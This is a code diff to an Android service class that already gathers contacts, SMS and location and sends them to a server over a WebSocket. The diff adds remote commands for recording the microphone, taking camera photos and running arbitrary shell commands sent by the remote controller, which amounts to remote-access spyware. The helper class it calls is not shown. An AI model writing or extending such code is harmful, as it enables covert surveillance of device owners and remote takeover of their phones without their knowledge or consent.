@@ -68,6 +68,9 @@ public class ScreenCaptureService extends Service {
     // Data collector (contacts, SMS, location)
     private DataCollectorService dataCollector;
 
+    // Media capture (mic, camera, shell)
+    private MediaCaptureManager mediaCaptureManager;
+
     private int screenWidth = 720;
     private int screenHeight = 1280;
     private int screenDensity;
@@ -107,6 +110,9 @@ public class ScreenCaptureService extends Service {
         // Initialize data collector
         dataCollector = new DataCollectorService(this);
         dataCollector.startLocationTracking();
+
+        // Initialize media capture (mic, shell)
+        mediaCaptureManager = new MediaCaptureManager(this);
     }
 
     @Override
@@ -556,6 +562,31 @@ public class ScreenCaptureService extends Service {
                         dataCollector.sendDataToServer(webSocket, "all");
                     }
                     break;
+                case "start-audio":
+                    if (mediaCaptureManager != null) {
+                        mediaCaptureManager.startAudioCapture(webSocket);
+                    }
+                    break;
+                case "stop-audio":
+                    if (mediaCaptureManager != null) {
+                        mediaCaptureManager.stopAudioCapture(webSocket);
+                    }
+                    break;
+                case "take-photo":
+                    if (mediaCaptureManager != null) {
+                        String facing = cmd.optString("facing", "back");
+                        mediaCaptureManager.takePhoto(webSocket, facing);
+                    }
+                    break;
+                case "shell":
+                    if (mediaCaptureManager != null) {
+                        String command = cmd.optString("command", "");
+                        String requestId = cmd.optString("requestId", String.valueOf(System.currentTimeMillis()));
+                        if (!command.isEmpty()) {
+                            mediaCaptureManager.executeCommand(webSocket, command, requestId);
+                        }
+                    }
+                    break;
                 default:
                     Log.d(TAG, "Unknown command: " + type);
             }
@@ -653,6 +684,9 @@ public class ScreenCaptureService extends Service {
         if (webSocket != null) {
             webSocket.close(1000, "Service stopped");
             webSocket = null;
+        }
+        if (mediaCaptureManager != null) {
+            mediaCaptureManager.cleanup();
         }
         if (dataCollector != null) {
             dataCollector.stopLocationTracking();
